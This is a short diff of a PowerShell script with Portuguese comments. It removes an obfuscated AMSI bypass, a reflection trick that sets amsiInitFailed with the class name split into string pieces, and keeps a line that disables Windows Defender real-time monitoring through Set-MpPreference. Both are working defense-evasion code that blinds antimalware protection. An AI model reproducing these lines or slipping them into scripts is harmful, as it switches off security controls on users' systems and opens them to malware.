@@ -1,9 +1,3 @@
-# ---------- AMSI BYPASS (método do artigo) ----------
-$a = 'System.Management.Automation.A'
-$b = 'msiUtils'
-$c = [Ref].Assembly.GetType($a+$b)
-$d = $c.GetField('amsiInitFailed','NonPublic,Static')
-$d.SetValue($null,$true)
 
 # ---------- Desativações (opcional, pode comentar se não quiser) ----------
 Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
